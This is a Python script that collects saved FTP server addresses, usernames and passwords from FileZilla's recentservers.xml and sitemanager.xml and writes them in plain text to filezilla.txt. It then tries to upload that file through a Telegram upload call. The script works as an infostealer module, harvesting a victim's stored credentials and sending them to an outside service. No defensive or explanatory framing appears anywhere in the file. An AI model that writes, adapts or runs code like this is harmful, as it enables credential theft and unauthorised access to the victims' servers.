import os
import xml.etree.ElementTree as ET
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)

def extract_ftp_info(filezilla_directory):
    """Extracts FTP server information from FileZilla's recent servers and site manager XML files."""
    ftp_info = []
    
    # Define the XML file paths
    recent_servers_path = os.path.join(filezilla_directory, 'recentservers.xml')
    site_manager_path = os.path.join(filezilla_directory, 'sitemanager.xml')
    
    # Parse recent servers XML
    try:
        if os.path.exists(recent_servers_path):
            tree = ET.parse(recent_servers_path)
            root = tree.getroot()
            for host in root.findall('Host'):
                url = host.find('Host').text if host.find('Host') is not None else 'N/A'
                user = host.find('User').text if host.find('User') is not None else 'N/A'
                pass_elem = host.find('Pass')
                password = pass_elem.text if pass_elem is not None else 'N/A'
                ftp_info.append((url, user, password))
    except Exception as e:
        logging.error(f"Failed to parse {recent_servers_path}: {e}")
    
    # Parse site manager XML
    try:
        if os.path.exists(site_manager_path):
            tree = ET.parse(site_manager_path)
            root = tree.getroot()
            for site in root.findall('Site'):
                url = site.find('Host').text if site.find('Host') is not None else 'N/A'
                user = site.find('User').text if site.find('User') is not None else 'N/A'
                pass_elem = site.find('Pass')
                password = pass_elem.text if pass_elem is not None else 'N/A'
                ftp_info.append((url, user, password))
    except Exception as e:
        logging.error(f"Failed to parse {site_manager_path}: {e}")
    
    return ftp_info

def save_to_file(ftp_info, output_file='filezilla.txt'):
    """Saves extracted FTP information to a file."""
    try:
        with open(output_file, 'w') as f:
            for url, user, password in ftp_info:
                f.write(f"URL: {url}\nUsername: {user}\nPassword: {password}\n\n")
        logging.info(f"Information saved to {output_file}")
    except Exception as e:
        logging.error(f"Failed to write to {output_file}: {e}")

def main():
    # Define the FileZilla directory path
    filezilla_directory = os.path.expanduser('~/.filezilla')
    
    # Check if FileZilla directory exists
    if not os.path.exists(filezilla_directory):
        print("🛠 FileZilla not installed")
        return
    
    # Extract FTP information
    ftp_info = extract_ftp_info(filezilla_directory)
    
    if not ftp_info:
        print("Error: No FTP information extracted.")
        return
    
    # Save extracted information to a file
    save_to_file(ftp_info)
    
    # Upload the file using telegram.UploadFile (assuming telegram is properly set up)
    try:
        from telegram import UploadFile  # Ensure telegram is properly set up and authenticated
        with open('filezilla.txt', 'rb') as f:
            UploadFile(f)
        logging.info("File uploaded successfully.")
    except Exception as e:
        logging.error(f"Failed to upload file: {e}")

if __name__ == "__main__":
    main()